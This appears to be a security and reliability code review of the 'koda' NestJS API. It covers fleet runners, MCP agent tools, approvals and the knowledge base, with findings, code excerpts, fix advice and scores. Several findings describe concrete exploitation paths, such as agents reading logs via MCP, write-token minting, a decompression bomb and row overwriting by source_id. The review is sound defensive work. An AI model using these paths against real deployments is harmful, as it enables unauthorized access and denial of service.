| PERF-2 | `agents/agents.controller.ts:17` | Class-level `@Throttle(10/min)` (meant for credential routes) also covers `/agents/me`, `/agents`, `/:slug/pickup`; several agents behind one runner IP throttle each other. | Move the throttle to create/rotate/roles/delete only. |
| MEM-1 | `webhook-security/webhook-replay.guard.ts:71-73`; `schema.prisma` `WebhookDelivery @@index([receivedAt])` | `WebhookDelivery` rows are never purged (index unused); unbounded table growth. | Retention job like `OutboxRetentionProcessor`. |
| MEM-2 | `common/hooks/raw-body.hook.ts:39-48` | Every JSON request is buffered twice (rawBody + parsed body); an oversized body is drained to the end before 413. | Capture raw bytes only on webhook routes; destroy the socket on overflow. |
| ENH-2 | `main.ts` (no `enableShutdownHooks`; grep finds none in `src`) | `OnModuleDestroy` hooks (EmailDispatcher timer, VectorStore, VcsWebhookService) never run; SIGTERM drops in-flight requests. Leases make outbox/email recoverable. | `app.enableShutdownHooks()` before `start`. |
| ENH-3 | `ticket-links/dto/create-ticket-link.dto.ts:9-12`; `tickets/dto/*`, `comments/dto/*` | Free-form `linkType`; no `@MaxLength` on titles/descriptions/comment bodies (1 MiB body cap only). | `@IsIn` link types; sensible max lengths. |
| STYLE-1 | `koda-domain-writer/koda-domain-writer.service.ts:72-259` | `writeTicketEvent`, `writeDecisionEvent`, `indexDocument`, `importGraphify` have no production callers (only `writeAgentAction` is used); `agents.service.ts:22-35` still duplicates `UpdateRolesDto`/`UpdateCapabilitiesDto` from `agents/dto/`. | Delete dead paths/duplicates. |
| STYLE-2 | `policy/policy-gate.service.ts` (597 lines) | CI-only (`scripts/policy-gates-runner.ts`), never on a runtime path; also above the 400-line guideline. Prior LOW, unchanged. | Move under `scripts/` or document as CI tooling. |

---

### Prior-finding status (docs/20260925-review-whole-repo.md), this area only

| ID | Status @44269581 | Evidence |
|---|---|---|
| H1 refresh after logout | Fixed | `auth/auth.service.ts:104-106` rejects `principal.revoked`; `koda-jwt-refresh-strategy.provider.ts:32` computes it (also `disabled`). Residual: no rotation (SEC-7). |
| H2 no rate limiting | Fixed (residual) | `app.module.ts:143` `APP_GUARD` DefaultThrottlerGuard; `main.ts:27-30` trust proxy; per-route auth throttles `auth.controller.ts:34,57,100`. Residual: SEC-1 header spoofing. |
| H3 ciWebhookToken in DTO | Fixed | `projects/dto/project-response.dto.ts:91-108` no token; admin-only `projects.controller.ts:87-97`. |
| H4 agent status by anyone | Partial | `projects.controller.ts:254-263` now admin-or-self; residual SEC-2 (project admin mutates global row; self can un-pause). |
| H5 CUID cross-project / deleted transitions | Fixed | `prisma-tickets.repository.ts:289-330` scoped lookup + key-prefix check; `updateTicketStatusIf` adds `deletedAt: null` (`:349-357`); comments `comments.service.ts:41`, labels `labels.service.ts:105,162`, links `ticket-links.service.ts:33-43`. |
| H13 outbox envelope (producer side) | Fixed | `events/outbox-envelope.util.ts:31-65`; producers `tickets.service.ts:75-80`, `ticket-transitions.service.ts:109-113`. |
| M1 blank transition comment | Fixed | `tickets.controller.ts:153-159` `requireCommentBody` on verify/fix/verify-fix/close/reject. |
| M2 PATCH status bypass | Fixed (residual) | `tickets.service.ts:236-249` routes through transitions + TRANSITION check; residual BUG-2 non-atomic. |
| M3 transition race | Fixed | `ticket-transitions.service.ts:597-603,443-449` conditional `updateMany` -> 409. |
| M4 outbox failure count | Fixed | Replaced by `@nathapp/nestjs-outbox` relay; `outbox/prisma-outbox.store.ts:52-95` owner-guarded leases. |
| M5 webhook SSRF | Fixed | `webhook/outbound/outbound-url-guard.ts` (create + connect-time lookup), `outbound-http-client.ts:76-80` no redirects, fixed error codes. |
| M6 ticket number race | Fixed | `common/utils/ticket-number-retry.ts:32-54`, used by `tickets.service.ts:116` and `ci-webhook` repo `:40`. |
| M7 tenancy model | Fixed (residual) | Membership guard on tickets/comments/labels/assignees/watch; `GET /projects` scoped (`projects.service.ts:80-90`); ProjectMember rows via members API + invites. Residual SEC-4 (links: membership only). |
| M8 agents P2002/whitelist/DTO dupes | Partial | P2002 -> 409 `agents.service.ts:126-131`; `whitelist: true` default in `@nathapp/nestjs-app/dist/app/nathapp.js:345`; explicit field pick `:113-120`. Duplicate DTOs remain (`agents.service.ts:22-35`). |
| M15 KB doc on ticket delete | Fixed | `rag/kb-ticket-lifecycle.subscriber.ts:30-39` deletes on TICKET_DELETED; close-time index skips deleted (`ticket-transitions.service.ts:183`). |
| LOW pagination input | Fixed | `common/dto/koda-page.query.ts:15-28` Min/Max(100). |
| LOW outbox not transactional | Fixed | Events + outbox + webhook rows recorded inside the business tx (`tickets.service.ts:116-137,284-294`, `ticket-transitions.service.ts:579-628`). |
| LOW admin outbox retry/requeue | Fixed | `outbox/outbox-admin.service.ts:32-44` 404/409; `prisma-outbox.repository.ts:94-100` resets attempts. |
| LOW close() bypasses table | Fixed by ruling | Admin-only override `allowed-actions.ts:10-13`, `tickets.controller.ts:358-362`. |
| LOW CI webhook pre-signature leaks | Fixed | Uniform 401 `ci-webhook.controller.ts:40-43`; DTO validated after signature `:47`; `line` `@IsInt @Min(1)` `ci-webhook.dto.ts:37-42`. |
| LOW KodaDomainWriter trusts caller role | Fixed | Roles from DB `koda-domain-writer.service.ts:82-84`. New: BUG-3. |
| LOW DELETE webhook ignores slug | Fixed | `webhook.controller.ts:79-88` + `webhook.service.ts:87-93`; global route kept deliberately (`:68-77`). |
| LOW malformed webhook.events aborts dispatch | Fixed | `webhook-dispatcher.service.ts:34-42`. |
| LOW PolicyGateService unused at runtime | Open (by design) | Only `scripts/policy-gates-runner.ts:145`. STYLE-2. |
| LOW agent create/roles non-atomic | Partial | Create in tx `agents.service.ts:125-134`; `replaceRoles`/`replaceCapabilities` still not (BUG-5). |
| LOW pickup soft-delete / any caller | Fixed | `agents.service.ts:363-381` owner-or-admin, deleted project 404, roster check. New: BUG-3. |
| LOW project DTO i18n keys | Fixed | `i18n/{en,zh}/projects.json` have slugInvalid/keyInvalid; `common.json:11` isIn. |
| LOW duplicate slug 400 | Fixed | `projects.service.ts:45-54` ConflictAppException. Residual race BUG-6. |
| LOW PATCH soft-deleted project | Fixed | `projects.service.ts:105-109`. |
| LOW JWT_SECRET == REFRESH | Fixed | `config/env.validation.ts:14` `.invalid(Joi.ref('JWT_SECRET'))`. |
| LOW bootstrap-admin race | Fixed | `auth/prisma-auth.repository.ts:55-69` advisory lock in tx. |
| LOW SLO dashboard unbounded | Fixed | `monitoring/prisma-monitoring.repository.ts:6,56` take 10 000. |
| 09-14 SEC-1 webhook replay | Fixed | `webhook-security/webhook-replay.guard.ts` persisted dedup, P2002-only 409. |
| 09-14 BUG-2 assign DTO/perm | Fixed | `tickets/dto/assign-ticket.dto.ts`, `tickets.controller.ts:242-259` UPDATE Ticket, roster/member checks `tickets.service.ts:357-417`. |
| 09-14 BUG-12 login timing | Fixed | `auth.service.ts:27,85-90`. |

(H6-H12, M9-M14, M16-M28 are outside this area: VCS, RAG/memory, web, CLI, CI.)

---

### Rubric scores (0-20)

| Dimension | Score | Rationale |
|---|---|---|
| Security | 15 | All prior HIGH auth/tenancy defects closed; strong SSRF guard, replay guard, scoped refs, revocation, advisory-locked invariants. Deductions: proxy-trust header spoofing, coarse agent grants (delete tickets/labels, self-approval), links authz, role-cache staleness. |
| Reliability | 15 | Transactional outbox with leases, conditional transitions, ticket-number retry, idempotent notifications. Deductions: non-atomic PATCH, hard agent delete, VERIFIER pickup 403, unmapped P2002 races, no shutdown hooks, GitHub calls on request path. |
| API Design | 15 | Consistent `JsonResponse`, paging DTO, 404-vs-403 hiding, allowedActions on detail. Deductions: GET with side effects (pickup), project-scoped route editing global state, inconsistent permission styles (global `@RequiredPermission` vs `@ProjectPermission` vs inline asserts), free-form `linkType`/comment types. |
| Code Quality | 15 | Mostly small, well-documented services with traceable rationale. Deductions: dead KodaDomainWriter methods, duplicate DTOs, `as unknown as` casts in transitions, `any`-typed DTO mappers, 600-line transitions/policy files. |
| Best Practices | 14 | Good validation defaults (whitelist, Joi env), helmet/CORS via platform. Deductions: agent-first audit (approvalMode/approver) absent on all REST writes and many admin writes unaudited, no refresh rotation, no shutdown hooks, weak secret-length validation. |
| **Total** | **74/100** | |

---

## Review B: API fleet control plane + koda MCP endpoint

Repo: koda @ main `44269581` (read-only review, no tests run).
Scope: `apps/api/src/fleet/{fleet.module.ts, assistant (incl. mcp/), threads, approvals, runners, git-broker, sync, ingest, common, artifacts, repos, repo-config}`, `packages/fleet-protocol` (types only).
Checklists applied: universal.md, nestjs-app.md.

### Summary

| Severity | Count |
|---|---|
| CRITICAL | 0 |
| HIGH | 0 |
| MEDIUM | 5 |
| LOW | 5 |

No CRITICAL or HIGH findings. Runner auth (prefix-split guard, HMAC key lookup, single-use enrollment with CAS
`updateMany`, rollback on 409), lease fencing on every runner write, approval locking (job -> approval, thread ->
approval -> action), creator-only assistant decide with re-authorization at approve and again at execute, git token
cache (memory only, never logged, `redirect: 'manual'`), sync envelope validation, and artifact key/path checks all
hold up after tracing the callers.

### Findings

#### SEC-1 [MEDIUM] MCP gives agents read tools that the REST routes deliberately refuse to agents
- `apps/api/src/fleet/assistant/mcp/mcp-tool-catalog.ts:93-98` (`mcpToolDescriptors` = whole WORKSPACE projection)
- `apps/api/src/fleet/assistant/tools/fleet-tools.ts:143,186,210,236,289` (`koda_list_jobs`, `koda_get_job`,
  `koda_fleet_spend`, `koda_list_approvals`, `koda_job_log_excerpt`, all `permission: { kind: 'member' }`)
- REST counterparts: `logs/fleet-job-logs.controller.ts:16-18` ("R10: logs are for people; agents and runners get
  403 like the jobs controller"), `jobs/fleet-jobs.controller.ts:48,68,77,85`, `analytics/project-fleet-analytics.controller.ts:16`,
  `approvals/project-fleet-approvals.controller.ts` (`requireUser`).

```ts
export function mcpToolDescriptors(): readonly KodaToolDescriptor[] {
  return kodaToolDescriptorsFor('WORKSPACE').map((descriptor) => ({ ...descriptor, description: mcpDescriptionOf(descriptor) }));
}
```
Scenario: any agent key on a project's roster calls `POST /api/mcp` `tools/call koda_job_log_excerpt {project, jobId}`
and reads run/stdout/stderr log entries that `GET /projects/:slug/fleet/jobs/:id/logs` answers 403 for the same key.
The same applies to job lists, spend analytics and the approvals inbox. These tools were built for thread callers,
which are always users. The S5b-3 spec (`.nax/features/fleet-s5b-koda-mcp/spec.md` 3-R1..3-D6) never addresses R10.
Log text is masked and fenced, but masking is pattern-based and R10 is an explicit policy line.
Fix: decide R10 for MCP explicitly. Either add a per-tool `principals: 'users' | 'any'` flag (default `users` for the
fleet read tools) and filter `mcpToolDescriptors()` by it, or refuse in `AssistantToolExecutor.run` when
`isAgentPrincipal(caller.principal)` and the tool is user-only. If agents should have this reach, write the decision
down and change the R10 comment.

#### SEC-2 [MEDIUM] Project/REPO thread creators keep full write control after losing DEVELOPER: send, publish, discard, raise the cap
- `apps/api/src/fleet/threads/threads.controller.ts:120,140,149,159` (answer/publish/discard/sendMessage: only `assertUser`)
- `apps/api/src/fleet/threads/prisma-chat-thread.repository.ts:157-172,224-272,278-312,314-374` (gate = `createdById === userId` only)
- Contrast: `threads.controller.ts` create/plan/run check `CREATE FleetJob`; `workspace-threads.service.ts:122`
  re-checks `canHost` (CREATE FleetJob) on every workspace send.

```ts
if (threadBefore.createdById !== input.userId) throw new ForbiddenAppException({}, 'threads.notCreator');
// ...no ability check before createThreadJob / THREAD_PUBLISH
```
Scenario: a DEVELOPER creates a REPO thread and is later demoted to VIEWER (still a member, so `ProjectMembershipGuard`
passes). They can still (a) send messages, which dispatch THREAD session jobs that cost money; (b) `PATCH` the thread
`maxCostUsd`; (c) `POST :id/publish`, which queues a PUBLISH job, and the runner commits and pushes with the repo's
contents:write token; (d) discard. VIEWER has no `create/update FleetJob`, so plan/run and the REST dispatch already
refuse them.
Fix: re-check `CREATE FleetJob` against the caller's current project role in the thread service for sendMessage,
publish, discard and updateCap, as `WorkspaceThreadsService.sendMessage` does. Stop/end-session/archive can stay
creator-only, because they only reduce activity.

#### SEC-3 [MEDIUM] A PROJECT-thread job can mint a write-capable token for the anchor repo
- `apps/api/src/fleet/sync/sync.service.ts:136-140`

```ts
} else if (job.command === 'THREAD' && (await this.repo.findThreadTokenScope(job.id))?.kind === 'WORKSPACE') {
  gitTokenErrors.push({ jobId: job.id, reason: 'repo_not_assigned' });
} else {
  const repo = await this.repo.findRepo(job.repoId);           // PROJECT thread: anchor repo
  if (repo) granted.push({ jobId: job.id, leaseEpoch: job.leaseEpoch, repo }); // write mint
```
A PROJECT thread's job carries the project's anchor repo only as bookkeeping. The code comments say "the runner neither
clones nor fetches it", and the honest runner takes the no-checkout path (`apps/runner/src/thread/thread-job-run.ts:182,283`)
and never asks for it. The server-side fence refuses the no-`repoId` request for WORKSPACE (spec test "workspace AC-7")
but not for PROJECT. So a runner holding a PROJECT session lease that sends `{jobId, leaseEpoch}` with no `repoId` gets
a GitHub token with `contents: write, pull_requests: write` (or the GitLab project token) for the anchor repo. A PROJECT
session reads untrusted repo content, which makes it the most exposed to prompt injection, so it should be the
least-privileged path.
Fix: refuse when `scope?.kind === 'PROJECT' || scope?.kind === 'WORKSPACE'`, i.e. allow a no-`repoId` mint only for
non-THREAD jobs and REPO threads. Add a `sync-token-fence.spec.ts` case "PROJECT refuses the anchor token without repoId".

#### MEM-1 [MEDIUM] Bundle ingest buffers an unbounded number of allowlisted files (decompression bomb, API OOM)
- `apps/api/src/fleet/ingest/bundle-reader.ts:70-91`, `ingest/domain/bundle-ingest.domain.ts:17-26`

```ts
if ((header.size ?? 0) > INGEST_LIMITS.fileBytes) { ... }   // 32 MiB per file
readEntry(body).then((text) => { ... else acc[slot] = [...acc[slot], file]; })
```
Only the per-file size is capped (32 MiB). The number of `nax-out/cost/*.jsonl`, `review-audit/*/*.json` and
`finish-audit/*/*.result.json` entries is not capped, and neither is the total decompressed size. The upload cap
(`FLEET_BUNDLE_MAX_BYTES`, default 200 MiB) applies to compressed bytes. Repetitive JSON compresses about 1000:1, so
one 200 MiB bundle can hold thousands of 32 MiB cost files. The reader holds all of them as JS strings before
`parseBundle` runs, and the API process (the single instance) runs out of memory. `ingestOne` then retries the same
claim on the next kick or sweep after restart, up to `INGEST_MAX_ATTEMPTS`. The project rule says "Bundle contents are
untrusted". The bundle is built from runner/nax output, so a compromised runner, or a session that can write into the
job's output dir, is enough. Secondary: `[...acc[slot], file]` copies the array on every file (O(n^2)).
Fix: add `INGEST_LIMITS.totalBytes` (for example 64 MiB) and `maxFilesPerSlot`, count decompressed bytes in
`readEntry`, and stop reading (mark `oversized`/partial) once a limit is hit. Also cap `createGunzip` output, for
example a byte-counting Transform that destroys the stream past the limit. Use `push` on a local array.

#### BUG-1 [MEDIUM] An approved assistant action can stay APPROVED forever, with no outcome and no recovery
- `apps/api/src/fleet/assistant/actions/assistant-action-decisions.ts:84-95,124-133,141-156`
- `apps/api/src/fleet/assistant/actions/prisma-pending-action.repository.ts:113-118` (sweeper selects only `PENDING`)

```ts
this.live.publish(result.live);
const outcome = await this.executor.executeAction(result.action);   // writes tickets/jobs/etc.
const noteId = await this.finalize(result.action, outcome, now);    // separate tx
```
The approve commit (approval `approved`, action `APPROVED`) and the finalize transaction (`EXECUTED`/`FAILED` plus the
outcome note) are separate, and the tool runs between them. If the process restarts after the approve commit, or if
`finalize` throws (DB error, lock timeout), then: the write may already be done; the action is never `EXECUTED`/`FAILED`;
no outcome note is written, so `deliverOutcomeNotes` never tells the agent; and the decide request answers 500 even
though the approval is committed as approved. Nothing ever picks up `APPROVED` rows (`DELIVERABLE_STATUSES` excludes
them, `findDue` is `PENDING` only). Re-deciding answers `fleet.approvalNotPending`, so the user cannot recover from the UI.
Fix: (1) wrap `finalize` so its failure is logged and retried, without turning a committed approval into a 500;
(2) add a sweep for `APPROVED` rows older than N minutes that marks them `FAILED` with result
`error: <tool> outcome unknown (interrupted)` and writes the note. Do not re-run the tool, because it is not idempotent.

#### SEC-4 [LOW] A runner can add its own labels at enrollment, beyond the admin's enrollment labels
- `apps/api/src/fleet/runners/enrollment.service.ts:64`, `runners/dto/enroll.dto.ts` (`labels`, max 20)

```ts
labels: uniqueSorted([...enrollment.labels, ...body.labels]),
```
The spec's enroll body (`docs/superpowers/specs/2026-09-29-fleet-s1-dispatch-design.md` §3.1) has no `labels`. Labels
are the only per-runner selector for jobs (`selectorLabels`), and so for which repos' write tokens a runner receives.
A holder of any enrollment token can claim, say, a `secure` label the admin never issued. The merge also allows 40
labels against the DTO's `ArrayMaxSize(20)`.
Fix: use only `enrollment.labels` (admins edit labels via `PATCH /fleet/runners/:id`), or keep runner-proposed labels
in a separate `requestedLabels` field until an admin approves them.

#### BUG-2 [LOW] Sweeper and sync do not isolate per-item failures, unlike every other fleet loop
- `apps/api/src/fleet/sync/fleet-sweeper.ts:51-66` (no try/catch per job)
- `apps/api/src/fleet/sync/sync.service.ts:93-95` (`fillRunner` / `fillRunnerThreads` / `afterTerminal` not isolated)

If one silent job's transition throws deterministically, the whole sweep aborts every tick, and every later silent job
is never moved to CRASHED. In `sync`, an exception from placement turns the whole request into a 500 after acks and
reports have committed. While that persists, the runner gets no commands (CANCEL, ABANDON, APPROVAL_ANSWER) and no git
tokens. The project rule is "One failing job or ack in a sync is logged and skipped, never allowed to fail the whole request".
Fix: wrap each sweeper iteration in try/catch with a warn log (as `ApprovalExpirySweeper.tick` does). Wrap the two
placement calls in `sync` in try/catch and log, so delivery and token grant still run.

#### SEC-5 [LOW] A disabled runner still receives git tokens and commands, and its key cannot be revoked while it holds jobs
- `apps/api/src/fleet/sync/sync.service.ts:110-147` (no `enabled` check), `runners/runners.service.ts:62-72`
  (`remove` refused while unfinished jobs exist)

`enabled: false` only stops placement. A runner suspected of compromise keeps minting tokens for every job it holds
until those jobs end. The only key revocation is delete, which is refused while it holds jobs. An admin has to cancel
every job first, and server-owned terminal transitions do not call `broker.evict`. The fence does prevent minting
after the epoch moves.
Fix: add a `revoked` flag (or let delete force-crash held jobs). Have `CombinedAuthGuard.authenticateRunner` refuse
revoked runners, and evict their cached tokens.

#### ENH-1 [LOW] Writes from approved assistant actions are not linked to their PendingAction in the domain audit trail
- `apps/api/src/fleet/assistant/assistant-tool.executor.ts:130-141` (`actionContext` carries no action id)

For an approved thread action, the ticket, comment and job activity rows show the requesting user as the actor (by
design, 3-R3). Nothing on those rows links them to the `PendingAction` that holds `approvalMode: 'human'` and the
approver, so you cannot tell "the user did X" from "the assistant proposed X and the user approved it" in the
ticket/fleet activity timelines. MCP direct writes are similar: `FleetActivity`/`TicketActivity` show the agent but not
`approvalMode: none` or the action id. Given the agent-first audit ruling, carry `actionId` (and `origin`) in
`ToolContext` and add it to the activity payloads the tools write.

#### PERF-1 [LOW] GitTokenBroker and RunnerNotifier rebuild whole maps on every operation
- `git-broker/git-token.broker.ts:43,57`, `jobs/runner-notifier.ts:37-48`

Each mint, evict, add and remove copies the entire Map. This is O(n) per operation and is fine at today's fleet size.
Noted only because both run on the sync hot path (64 token requests per sync). It is the same pattern as prior s2a
PERF-1/2, which were left as is.

### Verified OK (traced, no finding)
- Runner/agent/user route isolation (`combined-auth.guard.ts`): a `kr_` key off a runner route and a non-runner key on
  a runner route both fail closed. The enroll route is `@Public` plus throttled. A 409 on enroll rolls back the token
  consumption.
- Every runner write (events, acks, tokens, bundle, config-edit fetch, tool relay) is fenced on `(runnerId, leaseEpoch)`
  under the job row lock. Stale writes queue one ABANDON, and errors are thrown after commit so the ABANDON survives.
- Bash approvals: `mayDecideBash` is checked before validation; there is no allow on truncated text and no option nax
  did not offer. They lock job then approval, re-check epoch/state/expiry, and expire-then-409 is committed. Agents are
  refused on project routes, and agents never hold ADMIN, so the admin routes are user-only in practice.
- Assistant actions: decide is creator-only. Re-authorization runs at decide and again inside `executeAction`
  (membership, disabled, CASL), and thread, approval and action locks are taken in order. The bash and action sweepers
  filter by approval `type`, so they never close each other's rows.
- MCP: agent-only principal, `MCP_ENABLED` gate, executor-owned validation (B1), project slug regex, roster-scoped
  membership, CASL on write tools (agents lack `create/update FleetJob`, so dispatch/cancel/requeue are refused for
  agents). Direct writes are recorded with `approvalMode: 'none'`, actor and origin. Non-idempotent MCP writes are by
  ruling (3-D5/3-D15), and the MCP approval policy is koda #301.
- Git broker: repo-scoped GitHub installation tokens, read-only mints per repo for PROJECT sessions, no GitLab
  read-only fallback, `redirect: 'manual'`, mint errors log only the error name. Forge paths are `encodeURIComponent`'d,
  and the canonical owner/name comes back from the forge.
- Artifacts: content-type, sha256, streaming size cap, key regex plus root containment, tmp-then-rename, previous
  bundle deleted only after commit (with an orphan activity on failure).
- Repo config: path allowlist (`.nax/` only, no `..`, no `.env`), per-file and total byte limits, case-insensitive
  duplicate check, `@ProjectPermission(CREATE FleetJob)` on writes, test hooks disabled under `NODE_ENV=production`.
- SSE: membership is re-checked through `stillAllowed`, slots are released in `onClose`, workspace streams are
  creator-only.

### Prior findings in this area (status at HEAD)
- `docs/20261003-review-fleet-s1-5-slice-2a-approval-relay.md`:
  - STYLE-3 (schema misalignment of `approvalTimeoutSec`): **fixed**. `apps/api/prisma/schema.prisma:974,1008` are aligned.
  - ENH-1, BUG-2, ENH-4: runner-side (`apps/runner/...`), outside this area, not re-checked.
- `docs/20261004-review-fleet-s2a-slice-1a.md`:
  - ENH-1 (fallback scheduled in-band, lost on crash): **closed by design**. `@design` remark at
    `apps/api/src/fleet/logs/log-fallback.service.ts:25-29`, with the sweeper as a deliberate follow-up.
  - ENH-4 (old bundle deleted after scheduling fallback): **addressed**. `apps/api/src/fleet/artifacts/bundle.service.ts:93-113`
    deletes only after commit, and the fallback uses the new key; a failed delete records `bundle.orphan_file`.
  - BUG-1..9, SEC-1, PERF-1/2, TEST-*: `fleet/logs/` (outside this area).
- `docs/20260930-review-fleet-s1-slice-3a.md`: all findings are runner-side, none in this area. Its ENH-4 (409 name
  taken): the API side still answers 409 and leaves the token usable (`enrollment.service.ts:55-80`, tx rollback), as
  documented.

### Rubric (0-20 each)

| Dimension | Score | Notes |
|---|---|---|
| Security | 16 | Strong fencing, auth isolation and approval locking. Deductions: MCP read widening (SEC-1), demoted-creator thread writes (SEC-2), PROJECT anchor write token (SEC-3). |
| Reliability | 16 | Good per-item isolation in acks, reports and expiry sweepers. Gaps: stuck APPROVED actions (BUG-1), FleetSweeper/sync placement isolation (BUG-2), ingest OOM (MEM-1). |
| API Design | 17 | Consistent route split (admin, project, runner, MCP), fixed i18n refusal keys, outcomes as 200 data where documented. Thread-route permission model inconsistent with the workspace route. |
| Code Quality | 17 | Small, cohesive files with design-decision references. A few long single-line conditionals and duplicated lock/re-read blocks in `prisma-chat-thread.repository.ts` (560 lines). |
| Best Practices | 17 | Immutability, no tx across HTTP or long-poll, secrets never logged. Agent-first audit linkage incomplete for assistant-executed writes (ENH-1). |
| **Total** | **83/100** | |

---

## Review C: fleet ops and code intelligence (koda main @ 44269581)

**Scope:**
- `apps/api/src/fleet/{jobs,schedules,knowledge,logs,analytics,dashboard,budgets,activity,tickets}`
- `apps/api/src/{vcs,code-intel,rag,memory,entity-graph,context,retrieval,skills}`
- About 26k LOC, excluding specs.

**Mode:** Read-only. No tests were run. Every finding was traced through its guards, decorators and callers.

**Installed packages checked:**
- `@nathapp/nestjs-auth`: string `@RequiredPermission('ADMIN')` checks `principal.authorities`, so it means global ADMIN only.
- `@nathapp/nestjs-prisma`: the transaction manager uses Prisma's default 5 s interactive timeout.

**Authz model used for the traces:**
- `ProjectMembershipGuard` resolves the caller's project role:
  - Global ADMIN resolves to `ADMIN`.
  - A user needs a ProjectMember row (any role, VIEWER included).
  - An agent must be on the roster and gets role `null`.
- `@ProjectRoles` only gates users. Agents and global ADMIN skip it (`project-membership.guard.ts:80`).
- Runner keys are refused on every non-runner route (`combined-auth.guard.ts:39-44`).

### Summary

| Severity | Count |
|:--|:--|
| CRITICAL | 0 |
| HIGH | 0 |
| MEDIUM | 9 |
| LOW | 13 |

Every prior HIGH and MEDIUM finding in this area is fixed at HEAD. The new MEDIUM findings fall into five groups:
- **Integrity (SEC-1, SEC-2):** the shared stores (LanceDB `source_id` and memory `activeKey`) are keyed globally, so a low-privilege writer can overwrite rows it does not own.
- **Soft-deleted projects (BUG-1):** background workers ignore project soft-delete.
- **Starvation and duplicates (BUG-2, BUG-3):** fleet placement can starve queued jobs, and VCS issue import can create duplicate tickets.
- **Ticket event contract (BUG-4, BUG-6):** the entity-graph `assigned` handler and the merged-PR transition do not match how the rest of the system writes ticket events.
- **Concurrency and audit (BUG-5, ENH-1):** LanceDB `optimize()` runs outside the write mutex, and nothing in this area records `approvalMode` or `approver`.

### Prior-finding status (in this area)

| ID | Status at HEAD | Evidence |
|:--|:--|:--|
| H6 merged-PR FK / terminal guard | **Fixed** | `prisma-vcs.repository.ts:319-320` writes `authorAgentId: null`. Conditional write at `:287-296`. Residual issues are in BUG-6 below. |
| H7 KB double-index | **Fixed** | `rag.controller.ts:57-69`: one write path through `LanceTableManager.addRecord`. |
| H12 memory owner spoofing | **Fixed (core); residual in SEC-2** | `/extract` uses a DTO, sets `ownerId = principal.id` and drops DECISION items (`memory.controller.ts:70-86`). The generic route refuses DECISION (`:132-137`) and forces the owner for non-admins (`:142-143`). |
| H13 outbox envelope | **Fixed** | `events/outbox-envelope.util.ts`. `status_changed` is emitted at `ticket-transitions.service.ts:103` and `assigned` at `tickets.service.ts:410`. Residual: entity-graph data keys, see BUG-4. |
| M9 webhook secret never returned | Fixed | `vcs-connection.service.ts:77-95,205-207`; rotate route at `vcs.controller.ts:196-213`. |
| M10 pagination / stale cursor | Fixed | `vcs-polling.service.ts:110-117` re-reads the connection on each tick; `providers/pagination.ts:27` adds `inclusiveSince`. |
| M11 deleted imports re-imported | Fixed | `prisma-vcs.repository.ts:160-168` (no `deletedAt` filter); `external-vcs-id.ts:11-12` qualifies the id with the repo. |
| **M12 webhook prState regression** (deferred item) | **Fixed** | `prisma-vcs.repository.ts:287-296`: `updateMany` with `prState not 'merged'`; all webhook handlers use it. |
| M13 symbol id lacks project | Fixed | `code-intel/symbol-id.ts:5-7`. |
| M14 `code_document` table | Fixed | `prisma-rag.repository.ts:169-182` queries `GraphNode`. |
| M15 KB doc kept after ticket delete | Fixed | `rag/kb-ticket-lifecycle.subscriber.ts:28-40`. |
| M16 VIEWER KB write / NaN recency | Fixed | `rag.controller.ts:47` (`@ProjectRoles`); `created-at-override.ts`; `hybrid-retriever.service.ts:268,300`. |
| M17 FTS-only hits dropped | Fixed | `hybrid-retriever.service.ts:157-181,245`. |
| M18 tier on normalised score | Fixed | `hybrid-retriever.service.ts:434-439` tiers on raw cosine. |
| M19 graph/vector non-atomic | Fixed | `incremental-graph-diff.service.ts:65-90`: stale marker, one transaction, deduped links. |
| M20 unbounded context/timeline | Fixed | `prisma-canonical-state.repository.ts:72-88` uses `take`; timeline uses keyset paging (`timeline.service.ts:83`). Residual: unbounded dead code, see PERF-3. |
| M21 governance offset paging | Fixed | `memory-governance.service.ts:53,106,115`. |
| **Uppercase `TICKET_*` match no extraction rule** (deferred item) | **Still open (by design?)** | `extraction.service.ts:87,109,131` only handles `status_changed`, `assigned` and `incident_linked`. `TICKET_CREATED/UPDATED/DELETED` (`tickets.service.ts:132,291,322`; `fleet-ticket-event.recorder.ts:17`) still extract nothing. No producer emits `incident_linked`, so that branch and the entity-graph `incident_linked` case (`entity-graph.service.ts:282`) are dead code. |
| **`source_id`-only replace scope** (deferred item) | **Still open and exploitable**; see SEC-1 | `lance-table-manager.ts:443-450`. |
| LOW: `optimize()` fire-and-forget | Fixed (unhandled rejection) | `strategies/optimize-in-background.ts`. A new concurrency defect remains, see BUG-5. |
| LOW: LexicalIndexWarmup 50k rows | Fixed (removed) | No references remain. |
| LOW: `deleteByFile` unused | Fixed | `ast-index.service.ts:89-94`. |
| LOW: `syncMode` not `@IsEnum` | Fixed | `create-vcs-connection.dto.ts:31-33`. |
| LOW: `GetContextQueryDto` no validators | Fixed | `context/dto/get-context-query.dto.ts`. |
| LOW: evaluate-retrieval re-seeds duplicates | Fixed (idempotent replace by `source_id`) | `scripts/evaluate-retrieval.ts:113-121` goes through `addRecord`. |
| LOW: poll catch unguarded | Fixed | `vcs-polling.service.ts:110-121,200-212`. |
| Slice-4 BUG-1..5, ENH-1..3, STYLE-1 | All fixed as the remediation table states | Spot-checked `pagination.ts:13,27`, `ticket-transitions.service.ts:245,287`, `ast-index.service.ts:63-66`. |
| (Out of area) H2 throttler | Fixed | `app.module.ts:143` registers `APP_GUARD`. This matters here because `fleet-job-logs.controller.ts:26` `@Throttle` is now active. |

---

### MEDIUM

#### SEC-1 [MEDIUM] Any rostered agent or project DEVELOPER can delete or overwrite any KB, knowledge, outcome or graph row by `source_id`
**Where:**
- `rag/rag.controller.ts:46-72`
- `rag/lance-table-manager.ts:443-450`
- `projects/project-membership.guard.ts:80`

**Code:**
```ts
// lance-table-manager.ts:443
await this.exclusive(tableName, async () => {
  if (isSafeFilterValue(record.source_id)) {
    await table.delete(`source_id = '${record.source_id}'`);   // any source, any owner
  }
  await table.add([record]);
});
```

**Problem:**
- `POST /projects/:slug/kb/documents` takes `sourceId` straight from the caller (`dto/add-document.dto.ts:10-13`, only `MinLength(1)`).
- The idempotent replace deletes every row in `project_<id>` with that `source_id`, whatever its `source`.
- All of these writers share the same `source_id` namespace in one table:
  - Ticket KB rows: `source_id = ticket CUID` (`kb-ticket-lifecycle.subscriber.ts:39`).
  - Repository knowledge: `repo:<repoId>:<path>` (`knowledge-repo-indexer.ts:155`).
  - Run outcomes: `outcome:<repoId>:<jobId>:<kind>` (`:180`).
  - Graphify nodes: `node.id` (`incremental-graph-diff.service.ts:186-191`).
